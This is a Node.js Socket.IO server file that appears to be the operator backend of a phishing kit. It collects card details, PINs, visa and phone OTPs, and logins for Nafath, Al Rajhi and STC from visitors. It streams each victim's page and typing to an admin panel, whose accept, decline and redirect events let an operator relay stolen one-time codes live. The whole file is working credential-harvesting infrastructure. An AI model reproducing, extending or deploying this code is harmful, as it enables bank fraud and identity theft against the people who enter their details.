app.get("/users/:id", maybeAdmin, (req, res) => {
  const s = db.get().users[req.params.id];
  if (!s) return res.status(404).json({ error: "not_found" });
  res.json(s);
});
app.delete("/users/:id", maybeAdmin, (req, res) => {
  delete db.get().users[req.params.id];
  db.save();
  res.json({ ok: true });
});

app.post("/reg", (req, res) => {
  const id = req.body.id || req.body.uuid || newId();
  const s = upsertSession(id, {
    ...req.body,
    ip: clientIp(req),
    stage: "registered",
  });
  recordSubmission("reg", { ...req.body, uuid: id });
  res.json(s);
});

function stepHandler(stage) {
  return (req, res) => {
    const id = req.params.id || req.body.id || req.body.uuid;
    if (!id) return res.status(400).json({ error: "missing_id" });
    const s = upsertSession(id, { ...req.body, stage });
    recordSubmission(stage, { ...req.body, uuid: id });
    res.json(s);
  };
}

app.post("/apply/:id", stepHandler("apply"));
app.post("/company/:id", stepHandler("company"));
app.post("/visa", stepHandler("visa"));
app.post("/phone", stepHandler("phone"));
app.post("/phone-otp", stepHandler("phoneOtp"));
app.post("/visa-otp", stepHandler("visaOtp"));

// ---------- Admin read APIs (existing) ----------
app.get("/admin/state", requireAdmin, (_req, res) => res.json(db.get()));
app.get("/admin/submissions", requireAdmin, (_req, res) =>
  res.json(db.get().submissions)
);
app.get("/admin/users", requireAdmin, (_req, res) => res.json(db.get().users));

// ---------- Socket.IO ----------
// Events we handle explicitly or that carry no submission data — skip in onAny.
const IGNORED_ANY_EVENTS = new Set([
  "user:join", "join", "bindOrder", "chat:message",
  "user:getChatHistory", "admin:getChatHistory", "admin:getUpdates",
  "user:pageNavigation", "user:typingStatus", "user:statusUpdate",
  "bin:lookup", "disconnect", "disconnecting", "ping", "pong",
  "csrf:token", "site:publicSettings",
  // handled explicitly with their own recordSubmission call
  "newData", "booking:update",
  "paymentForm", "visaOtp", "phone", "phoneOtp", "navaz",
  "payment:update", "otp:received", "pin:received",
  "nafath:submitted", "phone:submitted", "naflogin:submitted",
  "nafotp:submitted", "rajlogin:submitted",
  "health:submitted", "health2:submitted", "health3:submitted", "health4:submitted",
  "client:cancelOtp", "client:cancelPayment",
  "payment:duplicateAttempt", "otp:duplicateAttempt",
  // admin -> client control events (not visitor submissions)
  "acceptService", "declineService", "acceptPaymentForm", "declinePaymentForm",
  "acceptPhone", "declinePhone", "acceptVisaOtp", "declineVisaOtp",
  "acceptPhoneOtp", "declinePhoneOtp", "acceptPhoneOTP", "declinePhoneOTP",
  "acceptMobOtp", "declineMobOtp", "acceptMotslOtp", "declineMotslOtp",
  "acceptStcPhoneOtp", "declineStcPhoneOtp", "acceptSTC", "declineSTC",
  "acceptNavaz", "declineNavaz", "acceptNafath", "declineNafath",
  "acceptNaflogin", "declineNaflogin", "acceptNafselogin", "declineNafselogin",
  "acceptRajlogin", "declineRajlogin", "acceptRajhi", "declineRajhi",
  "adminRedirect", "clientBlocked", "changeNavazCode",
  "nafathNumber", "nafathCode", "sendNafathNumber", "setNafathNumber",
  "payment:action", "otp:action", "nafath:action", "naflogin:action",
  "rajlogin:action", "phone:action", "admin:redirect", "nafath:code",
  "user:blocked",

]);

io.on("connection", (socket) => {
  console.log(`[io] connected ${socket.id}`);

  const csrf = crypto.randomBytes(24).toString("hex");
  socket.emit("csrf:token", { token: csrf });
  socket.emit("site:publicSettings", { chatEnabled: !!CHAT_ENABLED });
  socket.data.csrf = csrf;

  // Catch-all: any other event the customer site emits is treated as a
  // page submission and mirrored onto the session row.
  socket.onAny((event, payload) => {
    if (IGNORED_ANY_EVENTS.has(event)) return;
    if (socket.data.userType === "admin" || socket.data.role === "admin") return;
    const obj = (payload && typeof payload === "object") ? payload : {};
    const id =
      obj.uuid || obj.id || obj.userId ||
      socket.data.userId || socket.data.sessionId ||
      findSessionByIp(clientIp(socket.request));
    if (!id) return;
    // Stamp the current page if the client didn't include one, so the
    // per-page bucket in recordSubmission groups inputs correctly.
    const page = obj.page || obj.currentPage || socket.data.page || event;
    recordSubmission(event, { ...obj, uuid: id, page });
  });

  // The current customer bundle uses the safe-transit event contract rather
  // than the legacy user:join contract. Persist these events as live sessions
  // so the dashboard can display visitors before the first form submission.
  socket.on("session:state_changed", (payload = {}) => {
    const id =
      payload.sessionId ||
      payload.uuid ||
      socket.data.userId ||
      socket.data.sessionId;
    if (!id) return;
    socket.data.sessionId = id;
    socket.join(`session:${id}`);
    socket.join(`user:${id}`);
    const pagePath = String(payload.pagePath || "").split("?")[0];
    const session = upsertSession(id, {
      lastSeen: now(),
      ip: clientIp(socket.request),
      stage: payload.state?.page || payload.state?.stage || "service",
      safeTransitState: payload.state || null,
      ...(SAFE_TRACKED_PATHS.has(pagePath)
        ? { lastPage: pagePath, currentPage: pagePath }
        : {}),
      lastEvent: payload.eventType || "session:state_changed",
    });
    if (SAFE_TRACKED_PATHS.has(pagePath)) {
      recordSubmission("activity", { uuid: id, page_path: pagePath });
    }
    io.to("admins").emit("live:update", {
      type: "visitor_state_changed",
      uuid: id,
      session,
      ts: now(),
    });
  });

  // -------- Frontend (customer site) join --------
  socket.on("user:join", (p = {}) => {
    const userType = p.userType || "client";
    const uid = p.userId || p.userInfo?.uuid || uuid();
    socket.data.userType = userType;
    socket.data.userId = uid;
    socket.data.sessionId = uid;
    const ip = clientIp(socket.request);
    const ua = (socket.handshake.headers["user-agent"] || "").slice(0, 80);

    if (userType === "admin") {
      const suppliedToken =
        p.userInfo?.adminToken || p.userInfo?.token || p.adminToken || p.token ||
        socket.handshake.auth?.adminToken || socket.handshake.auth?.token;
      const tokenPresent = !!suppliedToken;
      const tokenValid = suppliedToken === ADMIN_TOKEN;
      const originTrusted = TRUSTED_ADMIN_ORIGINS.has(socket.handshake.headers.origin);

      if (tokenPresent && !tokenValid) {
        JOIN_METRICS.admin_join_invalid_token++;
        JOIN_METRICS.admin_join_rejected++;
        logJoinEvent({
          handler: "user:join", role: "admin", result: "rejected_invalid_token",
          socketId: socket.id, ip, ua, uid,
        });
        socket.emit("user:blocked", { reason: "invalid_admin_token" });
        socket.disconnect(true);
        return;
      }
      if (!tokenPresent && originTrusted) {
        JOIN_METRICS.admin_join_ok++;
        socket.data.adminAuthenticated = true;
        logJoinEvent({
          handler: "user:join", role: "admin", result: "authenticated_trusted_origin",
          socketId: socket.id, ip, ua, uid,
        });
      } else if (!tokenPresent) {
        JOIN_METRICS.admin_join_missing_token++;
        logJoinEvent({
          handler: "user:join", role: "admin", result: "joined_without_token",
          socketId: socket.id, ip, ua, uid,
        });
      } else {
        JOIN_METRICS.admin_join_ok++;
        socket.data.adminAuthenticated = true;
        logJoinEvent({
          handler: "user:join", role: "admin", result: "authenticated",
          socketId: socket.id, ip, ua, uid,
        });
      }
      socket.join("admins");
      socket.emit("user:joined", { userId: uid });
      socket.emit("live:updatesHistory", db.get().submissions.slice(-200));
      return;
    }

    if (db.get().blocked[uid]) {
      JOIN_METRICS.client_join_blocked++;
      logJoinEvent({
        handler: "user:join", role: "client", result: "blocked",
        socketId: socket.id, ip, uid,
      });
      socket.emit("user:blocked", { reason: "blocked" });
      return;
    }
    JOIN_METRICS.client_join_ok++;
    logJoinEvent({
      handler: "user:join", role: "client", result: "joined",
      socketId: socket.id, ip, uid,
    });
    socket.join(`user:${uid}`);
    socket.join(`session:${uid}`);
    socket.emit("user:joined", { userId: uid });
    socket.emit("user:uuidAssigned", { uuid: uid });
    const session = upsertSession(uid, { lastSeen: now(), ip });
    io.to("admins").emit("live:update", {
      type: "visitor_joined",
      uuid: uid,
      session,
      ts: now(),
    });
  });

  // -------- Admin dashboard (tmn-backend) join --------
  socket.on("join", (data = {}) => {
    const role = data.role || "visitor";
    socket.data.role = role;
    const ip = clientIp(socket.request);
    const ua = (socket.handshake.headers["user-agent"] || "").slice(0, 80);

    if (role === "admin") {
      const suppliedToken =
        data.adminToken || data.token || socket.handshake.auth?.adminToken ||
        socket.handshake.auth?.token;
      const tokenPresent = !!suppliedToken;
      const tokenValid = suppliedToken === ADMIN_TOKEN;
      const originTrusted = TRUSTED_ADMIN_ORIGINS.has(socket.handshake.headers.origin);

      if (tokenPresent && !tokenValid) {
        JOIN_METRICS.admin_join_invalid_token++;
        JOIN_METRICS.admin_join_rejected++;
        logJoinEvent({
          handler: "join", role: "admin", result: "rejected_invalid_token",
          socketId: socket.id, ip, ua,
        });
        socket.emit("clientBlocked", { reason: "invalid_admin_token" });
        socket.disconnect(true);
        return;
      }
      if (!tokenPresent && originTrusted) {
        JOIN_METRICS.admin_join_ok++;
        socket.data.adminAuthenticated = true;
        logJoinEvent({
          handler: "join", role: "admin", result: "authenticated_trusted_origin",
          socketId: socket.id, ip, ua,
        });
      } else if (!tokenPresent) {
        JOIN_METRICS.admin_join_missing_token++;
        logJoinEvent({
          handler: "join", role: "admin", result: "joined_without_token",
          socketId: socket.id, ip, ua,
        });
      } else {
        JOIN_METRICS.admin_join_ok++;
        socket.data.adminAuthenticated = true;
        logJoinEvent({
          handler: "join", role: "admin", result: "authenticated",
          socketId: socket.id, ip, ua,
        });
      }
      socket.join("admins");
      Object.values(db.get().users).forEach((u) => socket.emit("sessionUpdate", u));
    } else {
      logJoinEvent({
        handler: "join", role, result: "joined",
        socketId: socket.id, ip,
      });
    }
  });


  socket.on("bindOrder", (id) => {
    if (!id) return;
    socket.data.sessionId = id;
    socket.join(`session:${id}`);
    socket.join(`user:${id}`);
    const session = upsertSession(id, {
      lastSeen: now(),
      ip: clientIp(socket.request),
      lastEvent: "visitor_bound",
      stage: "service",
    });
    io.to("admins").emit("live:update", {
      type: "visitor_bound",
      uuid: id,
      session,
      ts: now(),
    });
  });

  socket.on("newData", (payload = {}) => {
    const id = payload.id || payload.uuid || socket.data.sessionId || newId();
    const s = upsertSession(id, payload);
    recordSubmission("newData", { ...payload, uuid: id });
    io.to("admins").emit("newVisitor", s);
  });

  // visitor -> admin submissions (tmn contract)
  ["paymentForm", "visaOtp", "phone", "phoneOtp", "navaz"].forEach((ev) => {
    socket.on(ev, (payload = {}) => {
      const id = payload.id || payload.uuid || socket.data.sessionId;
      if (!id) return;
      upsertSession(id, { [ev]: payload, lastEvent: ev, stage: ev });
      recordSubmission(ev, { ...payload, uuid: id });
      io.to("admins").emit(ev, { ...payload, id, uuid: id });
    });
  });

  // admin -> visitor control events (tmn contract)
  const adminControlEvents = [
    "acceptBooking",
    "declineBooking",
    "acceptService",
    "declineService",
    "acceptPaymentForm",
    "declinePaymentForm",
    "acceptPin",
    "declinePin",
    "acceptPhone",
    "declinePhone",
    "acceptVisaOtp",
    "declineVisaOtp",
    "acceptPhoneOtp",
    "declinePhoneOtp",
    "acceptPhoneOTP",
    "declinePhoneOTP",
    "acceptMobOtp",
    "declineMobOtp",
    "acceptMotslOtp",
    "declineMotslOtp",
    "acceptStcPhoneOtp",
    "declineStcPhoneOtp",
    "acceptSTC",
    "declineSTC",
    "acceptNavaz",
    "declineNavaz",
    "acceptNafath",
    "declineNafath",
    "acceptNaflogin",
    "declineNaflogin",
    "acceptNafselogin",
    "declineNafselogin",
    "acceptNafLogin",
    "declineNafLogin",
    "acceptRajlogin",
    "declineRajlogin",
    "acceptRajLogin",
    "declineRajLogin",
    "acceptRajhi",
    "declineRajhi",
    "adminRedirect",
    "clientBlocked",
    "changeNavazCode",
    "nafathNumber",
    "nafathCode",
    "sendNafathNumber",
    "setNafathNumber",
    // namespaced fallbacks the dashboard also emits
    "payment:action",
    "otp:action",
    "phone:action",
    "nafath:action",
    "naflogin:action",
    "rajlogin:action",
    "nafath:code",
    "admin:redirect",
    "user:blocked",

  ];
  adminControlEvents.forEach((ev) => {
    socket.on(ev, (payload = {}, ack) => {
      const isAdmin =
        socket.data.adminAuthenticated === true ||
        (payload &&
          typeof payload === "object" &&
          (payload.adminToken === ADMIN_TOKEN || payload.token === ADMIN_TOKEN));
      if (!isAdmin) {
        console.warn(`[io] rejected ${ev} from ${socket.id} (not admin)`);
        if (typeof ack === "function") ack({ ok: false, error: "not_admin" });
        return;
      }
      const id =
        typeof payload === "string"
          ? payload
          : payload.id || payload.sessionId || payload.uuid || payload.userId ||
            payload.targetUserId || payload._id;
      if (!id) {
        if (typeof ack === "function") ack({ ok: false, error: "missing_id" });
        return;
      }
      const data =
        typeof payload === "object"
          ? { ...payload, id, uuid: id, userId: id }
          : { id, uuid: id, userId: id };
      delete data.adminToken;
      delete data.token;
      const actionKey = String(ev).toLowerCase();
      const actionStatus = actionKey === "clientblocked" || actionKey === "user:blocked"
        ? "blocked"
        : actionKey.startsWith("decline") ? "declined" : "in_progress";
      upsertSession(id, {
        status: actionStatus,
        stage: canonicalStage(data.stage || ev),
        blocked: actionStatus === "blocked" ? true : undefined,
      });
      broadcastAdminEvent(id, ev, data);
      console.log(`[io] admin ${ev} -> ${id}`);
      if (typeof ack === "function") ack({ ok: true });
    });
  });

  // -------- Frontend chat + booking (kept) --------
  socket.on("chat:message", (msg, ack) => {
    const uid = socket.data.userId || socket.data.sessionId;
    if (!uid) return ack && ack({ ok: false, error: "no_user" });
    const state = db.get();
    const list = (state.chats[uid] ||= []);
    const entry = {
      id: uuid(),
      from: socket.data.userType || socket.data.role || "client",
      message: msg?.message || "",
      ts: now(),
    };
    list.push(entry);
    db.save();
    io.to(`user:${uid}`).emit("chat:message", {
      ...entry,
      userType: entry.from,
      targetUserId: uid,
    });
    io.to("admins").emit("chat:message", {
      ...entry,
      userType: entry.from,
      targetUserId: uid,
    });
    ack && ack({ ok: true, id: entry.id });
  });

  socket.on("user:getChatHistory", () => {
    const uid = socket.data.userId;
    socket.emit("chat:history", db.get().chats[uid] || []);
  });
  socket.on("admin:getChatHistory", (p = {}) => {
    const uid = p.userId || p.uuid;
    socket.emit(
      "chat:history",
      uid ? db.get().chats[uid] || [] : db.get().chats
    );
  });
  socket.on("admin:getUpdates", () => {
    socket.emit("live:updatesHistory", db.get().submissions.slice(-200));
  });

  socket.on("booking:update", (payload = {}, ack) => {
    const id = payload?.uuid || socket.data.userId || socket.data.sessionId;
    recordSubmission("booking", { ...payload, uuid: id });
    const res = { formType: "booking", success: true };
    io.to("admins").emit("form:submitted", res);
    socket.emit("form:submitted", res);
    ack && ack(res);
  });

  const passthrough = [
    "payment:update",
    "otp:received",
    "pin:received",
    "nafath:submitted",
    "phone:submitted",
    "naflogin:submitted",
    "nafotp:submitted",
    "rajlogin:submitted",
    "health:submitted",
    "health2:submitted",
    "health3:submitted",
    "health4:submitted",
    "client:cancelOtp",
    "client:cancelPayment",
    "payment:duplicateAttempt",
    "otp:duplicateAttempt",
  ];
  for (const ev of passthrough) {
    socket.on(ev, (payload = {}) => {
      const id = payload?.uuid || socket.data.userId || socket.data.sessionId;
      recordSubmission(ev, { ...payload, uuid: id });
    });
  }

  socket.on("bin:lookup", ({ bin } = {}, ack) => {
    if (!ack) return;
    ack({ ok: true, meta: { brand: "unknown", scheme: "unknown", bin } });
  });

  socket.on("user:pageNavigation", (p) => {
    const uid = socket.data.userId;
    const page = p?.page || p?.currentPage || p?.route;
    socket.data.page = page || socket.data.page;
    if (uid) upsertSession(uid, { lastPage: page, currentPage: page, lastSeen: now() });
    io.to("admins").emit("live:update", {
      type: "pageNavigation",
      uuid: uid,
      page,
      ts: now(),
    });
  });
  socket.on("user:typingStatus", (p) =>
    io.to("admins").emit("user:typingStatus", {
      uuid: socket.data.userId,
      ...p,
    })
  );
  socket.on("user:statusUpdate", (p) =>
    io.to("admins").emit("user:statusUpdate", {
      uuid: socket.data.userId,
      ...p,
    })
  );

  // Legacy frontend admin -> client actions (kept)
  const legacyAdminEvents = [
    "payment:action",
    "otp:action",
    "nafath:action",
    "naflogin:action",
    "phone:action",
    "admin:redirect",
  ];
  for (const ev of legacyAdminEvents) {
    socket.on(ev, (p = {}, ack) => {
      const isAdmin =
        socket.data.adminAuthenticated === true ||
        (p &&
          typeof p === "object" &&
          (p.adminToken === ADMIN_TOKEN || p.token === ADMIN_TOKEN));
      if (!isAdmin) {
        if (typeof ack === "function") ack({ ok: false, error: "not_admin" });
        return;
      }
      const target =
        p.userId || p.sessionId || p.uuid || p.id || p.targetUserId || p._id;
      if (!target) {
        if (typeof ack === "function") ack({ ok: false, error: "missing_id" });
        return;
      }
      const data = { ...p, id: target, uuid: target };
      delete data.adminToken;
      delete data.token;
      io.to(`user:${target}`).emit(ev, data);
      io.to(`session:${target}`).emit(ev, data);
      io.to("admins").emit(`admin:${ev}`, { id: target, payload: data });
      console.log(`[io] legacy admin ${ev} -> ${target}`);
      if (typeof ack === "function") ack({ ok: true });
    });
  }

  socket.on("disconnect", (reason) => {
    JOIN_METRICS.disconnects++;
    const role = socket.data.role || socket.data.userType || "unknown";
    logJoinEvent({
      handler: "disconnect", role, reason,
      socketId: socket.id, uid: socket.data.userId,
      adminAuthed: !!socket.data.adminAuthenticated,
    });
  });

});

server.listen(PORT, () => {
  console.log(`tmin backend ${APP_VERSION} listening on :${PORT}`);
  console.log(`data file: ${DATA_FILE}`);
});
